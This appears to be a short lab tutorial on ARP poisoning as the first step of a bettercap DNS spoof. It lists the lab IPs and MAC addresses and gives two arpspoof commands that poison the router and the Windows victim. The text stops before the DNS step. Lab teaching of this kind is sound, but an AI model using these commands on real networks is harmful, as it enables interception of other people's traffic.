We are going to perform DNS spoof attack using **bettercap** tool ------

Step 1 :

## First we have to perform Arp-Poisoning atttack with the victim machine 

How to Perform (In VM):

We have two machines **Kali** (Attacker)  and  **Windows** (Victim)  machines.


Physical Address and IP of Windows System ---->

```
Physical Address. . . . . . . . . : 00-0C-29-5B-B9-15

 IPv4 Address. . . . . . . . . . . : 192.168.229.132
```


Physical Address and IP of Linux System ---->

```
ether 00:0c:29:f2:93:7b

inet 192.168.229.131
```

Router IP adress ---->

```
192.168.229.2
```

## Attack (In Kali) :

```
sudo arpspoof -i eth0 -t 192.168.229.2 192.168.229.132 
```


```
sudo arpspoof -i eth0 -t 192.168.229.132 192.168.229.2
